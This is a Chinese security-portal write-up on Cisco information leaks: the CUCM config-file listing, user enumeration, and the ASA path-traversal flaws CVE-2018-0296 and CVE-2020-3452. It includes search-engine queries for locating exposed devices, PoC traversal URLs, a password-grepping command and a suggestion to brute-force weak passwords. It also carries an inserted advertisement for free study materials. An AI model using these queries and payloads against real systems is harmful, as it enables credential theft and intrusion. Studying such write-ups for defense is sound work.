---
title: CISCO设备信息泄漏漏洞案例2
url: https://www.freebuf.com/vuls/348162.html
source: FreeBuf网络安全行业门户
date: 2022-10-29
fetch_date: 2025-10-03T21:13:52.413832
---

# CISCO设备信息泄漏漏洞案例2

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

CISCO设备信息泄漏漏洞案例2

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

CISCO设备信息泄漏漏洞案例2

2022-10-28 15:57:05

所属地 湖南省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 前言

上一篇文章介绍了cisco路由器设备的2个漏洞案例，这次补充cisco ip电话设备和安全设备的漏洞案例。

## CISCO-UCM ConfigFileCacheList.txt 泄漏

CISCO-UCM 全称Cisco Unified Communications Manager,是用于集成CISCO的语音视频通话、消息传递和移动协作的基础设施

部分 CUCM 服务器在端口 TCP/6970 上有一个 HTTP 服务,其中存在 ConfigFileCacheList.txt 文件,包含位于 TFTP 目录中的所有文件名

fofa语句

```
product=="CISCO-UCM"
```

shodan语句

```
http.html:"Cisco Unified Communications Manager"
```

payload

```
x.x.x.x:6970/ConfigFileCacheList.txt
```

在目标文件中包含了许多SEP开头的文件，那是ip电话的配置文件，sep后面接的是mac地址

![Untitled](https://image.3001.net/images/20221028/1666943825_635b8b51a7f5f1e9164ac.png!small)

可以遍历下载这个ConfigFileCacheList.txt文件内容中的所有文件

![Untitled](https://image.3001.net/images/20221028/1666943826_635b8b52ec0bb8459910c.png!small)

在下载的配置文件中，包含ip，描述，端口等配置信息

![Untitled](https://image.3001.net/images/20221028/1666943833_635b8b59befe8c2aab216.png!small)

甚至有的还会包含明文的账号密码

![Untitled](https://image.3001.net/images/20221028/1666943835_635b8b5b0a1464ccce199.png!small)

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图
② 60+网安经典常用工具包
③ 100+SRC漏洞分析报告
④ 150+网安攻防实战技术电子书
⑤ 最权威CISSP 认证考试指南+题库
⑥ 超1800页CTF实战技巧手册
⑦ 最新网安大厂面试题合集（含答案）
⑧ APP客户端安全检测指南（安卓+IOS）

可以用egrep批量查找

```
egrep -r 'Password' *.xml
```

![Untitled](https://image.3001.net/images/20221028/1666943836_635b8b5c3e1555a0af2de.png!small)

在配置文件中获得了账号密码后，可以尝试登录UCM的web后台

![Untitled](https://image.3001.net/images/20221028/1666943838_635b8b5ed9857d7a70200.png!small)

当然这个 ConfigFileCacheList.txt 泄漏比较少见，如果遇到UCM可以试试访问`/cucm-uds/users`路径,可以泄漏用户名信息，再针对用户名进一步爆破弱口令

![Untitled](https://image.3001.net/images/20221028/1666943840_635b8b608feedb8607536.png!small)

## CVE-2018-0296 Cisco ASA 目录遍历漏洞

Cisco ASA是思科的防火墙设备，一般用于在企业边界，包含了ips，avc，wse等应用功能。

fofa语句

```
app="CISCO-ASA-5520"
```

根据文章 <https://www.anquanke.com/post/id/171916>中的描述,CVE-2018-0296在不同型号设备上存在2种利用场景，一种是拒绝服务造成设备崩溃重启，一种是目录遍历获得敏感信息

在修复方案中则是增加了对`./`和`../`的处理逻辑，以防止目录遍历

拒绝服务这里就不具体测试了，主要看下目录遍历的利用

检测poc

```
/+CSCOU+/../+CSCOE+/files/file_list.json
```

![Untitled](https://image.3001.net/images/20221028/1666943841_635b8b61d0e0edd153321.png!small)

注意，类似的poc不能在浏览器里直接粘贴访问，因为浏览器会自动将访问的路径类似/../解析为上一级目录，也就是访问的为`/+CSCOE+/files/file_list.json`

列出 /sessions 目录的内容

```
/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions
```

![Untitled](https://image.3001.net/images/20221028/1666943843_635b8b6331df0137465ad.png!small)

提取登录用户的登录信息

```
/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/[name]
```

![Untitled](https://image.3001.net/images/20221028/1666943844_635b8b6481f20bc7d154f.png!small)

## CVE-2020-3452 Cisco ASA 目录遍历漏洞

CVE-2020-3452漏洞可以在未验证的情况下进行任意文件读取

该漏洞源于 ASA 和 FTD 的 web 服务接口在处理 HTTP 请求的 URL 时缺乏正确的输入验证，导致攻击者可以在目标设备上查看系统内的web目录文件。

此漏洞不能用于获取对 ASA 或 FTD 系统文件或底层操作系统 (OS) 文件的访问，所以只能读取 web 系统目录的文件，比如 webｖpn 的配置文件、书签、网络 cookies、部分网络内容和超文本传输协议网址等信息。

作者在推特分享的检测poc

<https://twitter.com/aboul3la/status/1286141887716503553>

```
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language⟨=../
```

读取 `/+CSCOE+/portal_inc.lua`文件

![Untitled](https://image.3001.net/images/20221028/1666943845_635b8b65bf486ca94caa3.png!small)

至于进一步利用，有研究人员给出了一些已知文件列表

<https://twitter.com/HackerGautam/status/1286652700432662528>

<https://raw.githubusercontent.com/3ndG4me/CVE-2020-3452-Exploit/master/cisco_asa_file_list.txt>

不过实际测试，除了`session.js`跑出了一个乱码的内容以外，其他的文件多是一些资源文件，难以进一步利用。

**更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

# 渗透测试 # 漏洞挖掘 # cisco # Cisco IP电话

![]()

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
已在FreeBuf发表 0 篇文章

本文为 独立观点，未经授权禁止转载。
如需授权、对文章有疑问或需删除稿件，请联系 FreeBuf
客服小蜜蜂（微信：freebee1024）

被以下专辑收录，发现更多精彩内容

+ 收入我的专辑

+ 加入我的收藏

展开更多

相关推荐

![]()

关 注

* 0 文章数
* 0 关注者

文章目录

前言

CISCO-UCM ConfigFileCacheList.txt 泄漏

CVE-2018-0296 Cisco ASA 目录遍历漏洞

CVE-2020-3452 Cisco ASA 目录遍历漏洞

![](/images/logo_b.png)

本站由阿里云 提供计算与安全服务

### 用户服务

* [有奖投稿](https://www.freebuf.com/write)
* [提交漏洞](https://www.vulbox.com/bounties/detail-72)
* [参与众测](https://www.vulbox.com/projects/list)
* [商城](https://shop.freebuf.com)

### 企业服务

* [安全咨询](https://company.freebuf.com)
* [产业全景图](https://www.freebuf.com/news/307349.html)
* [企业SRC](https://www.vulbox.com/service/src)
* [安全众测](https://www.vulbox.com/)

### 合作信息

* [斗象官网](https://www.tophant.com/)
* [广告投放](https://www.freebuf.com/articles/444331.html)
* [联系我们](https://www.freebuf.com/articles/444332.html)

### 关于我们

* [关于我们](https://www.freebuf.com/news/others/864.html)
* 微信公众号
* [新浪微博](http://weibo.com/freebuf)

### 战略伙伴

* [![](https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png)](http://www.aliyun.com/?freebuf)

### FreeBuf知识大陆

![](https://image.3001.net/images/20250703/1751535036_68664dbcae34ac40bb9e7.png)

扫码把安全装进口袋

* [斗象科技](https://www.tophant.com/)
* [FreeBuf](https://www.freebuf.com)
* [漏洞盒子](https://www.vulbox.com/)
* [斗象智能安全](https://ai.tophant.com/)
* [免责条款](https://www.freebuf.com/dis)
* [协议条款](https://my.freebuf.com/AgreeProtocol/duty)

Copyright © 2025 WWW.FREEBUF.COM All Rights Reserved
[沪ICP备2024099014号](https://beian.miit.gov.cn/#/Integrated/index) | [沪公安网备
![](https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321)